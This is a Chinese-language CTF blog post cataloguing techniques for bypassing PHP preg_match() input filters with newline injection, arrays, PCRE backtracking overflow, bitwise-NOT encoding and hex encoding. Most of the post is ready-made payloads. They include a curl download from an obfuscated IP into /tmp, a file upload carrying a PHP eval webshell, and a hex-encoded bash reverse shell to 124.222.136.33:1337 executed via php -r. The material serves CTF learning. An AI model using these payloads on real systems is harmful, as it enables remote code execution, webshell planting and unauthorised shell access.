---
title: preg_match
date: 2024-06-12 20:04:39
categories:
- PHP
tags:
- 函数绕过
description: " "
---

&emsp;&emsp;正则匹配也是php中最常见的一种，一般用来做一个~~装饰~~匹配作用，我们通常用以下几种绕过方式来规避正则匹配。

### 基本思路
&emsp;&emsp;正则匹配后面都会有一个修饰符，各位要判断相应的修饰符选择哪一种绕过方式，别无脑套，推荐一个网站[正则表达式在线测试](https://www.jyshare.com/front-end/854/),它提供了修饰符的介绍和语法参考，方便我们继续匹配。། – _ – །

### 换行符绕过（%0a）
&emsp;&emsp;通常的，preg_match()函数只能匹配一行数据，尤其是遇到这种情况
![ciscn](/images/ciscn.png)
&emsp;&emsp;看着如此长的过滤，但因为修饰符只有一个i（忽略大小写），我们可以直接%0a绕过(过滤点的方式可以将IP转成十进制)
```bash
cmd=cu%0arl+http://795973494:8000/s -o /tmp/s
```
&emsp;&emsp;简单的来说，当遇到修饰符只有i的时候，可以用换行符%0a秒了。
```
preg_match('/^flag$/i', $_GET['a'])
```
&emsp;&emsp;因此我们传入?a=flag%0a即可绕过

### 利用数组绕过
&emsp;&emsp;同md5()函数原理，当参数是数组类型的时候，会以报错的形式来绕过判断。但值得一提的是，整个if条件不执行，如果里面是输出flag形式的，此方法无用。
```
<?php
$a=$_GET['a'];
if(!preg_match("/flag/",$a)==false)
    die("hacker");
    echo $flag;
?>
```
&emsp;&emsp;这种我们可以用数组进行绕过，让if条件报错。不仅仅针对preg_match，数组绕过针对大多匹配的函数都有效，例如strcmp。
```
?a[]=flag.php
```

### PCRE回溯限制绕过
&emsp;&emsp;如何绕过呢，让回溯次数超过最大限制就可以使preg_match()函数返回false，从而绕过限制，中文的回溯次数在100万次就好崩溃，这个回溯保护使PHP为了防止关于正则表达式的DDOS   
payload:  
GET:
```
import requests
from io import BytesIO

payload =BytesIO(b'[]'+b'a'*1000000)
res = requests.get('[]?[]='+str(payload))
print(res.text)
```
POST:  
```
import requests
from io import BytesIO

files = {
  'file': BytesIO(b'aaa<?php eval($_POST[txt]);//' + b'a' * 1000000)
}

res = requests.post('[]', files=files, allow_redirects=False)
print(res.headers)
```
&emsp;&emsp;[]即代表根据题目来填充

### 取反绕过
&emsp;&emsp;就是通过URL编码进行取反绕过，当然其他编码也是可以的，进制就更不用说了（通常使用十六进制），这里略微举个例子
```
<?php echo urlencode(~"phpinfo");
```
取反得到%8F%97%8F%96%91%99%90（取反使用的使不可见字符，遇到/s还是得寄）
```
?code=$_=~(%8F%97%8F%96%91%99%90);$_();
```


### %5c绕过
&emsp;&emsp;这个不常见，%5c其实就是"\\",了解一下就可以了
```
preg_match('/^[a-z0-9_]*$/isD',$act)
```
```
/i不区分大小写

/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]

/D如果使用$限制结尾字符,则不允许结尾有换行;
```
&emsp;&emsp;这里存在/s和/D因此它会匹配到换行，%0a因此就无法绕过。这时候就可以使用%5c

### 单引号绕过
&emsp;&emsp;这个也不常用，在每一个字符前加上单引号可以绕过preg_match的匹配。
![单引号绕过](/images/单引号绕过.png)

### 进制绕过
&emsp;&emsp;通过进制绕过是通用的，我们可以将指令转成十六进制，然后用php -r进行php代码执行。  
![ciscn](/images/ciscn.png)
&emsp;&emsp;payload
```
cmd=php -r $a=substr(Z62617368202d63202262617368202d69203e26202f6465762f7463702f3132342e3232322e3133362e33332f3133333720303e263122,1);system(hex2bin($a));
```
&emsp;&emsp;这段十六进制是命令<font color=blue>bash -c "bash -i>& /dev/tcp/124.222.136.33/1337 0>&1"</font>这条命令的意思是向124.222.136.33(服务器的IP)的1337端口建立一个连接，输入(0)的内容变为命令输出(1)。之所以前面有z不属于16进制的字符存在时因为加不了引号，开头是数字的话，就会将类型识别为数字，若后续出现了字符串就会报错，所以我们要用substr将类型转为字符串。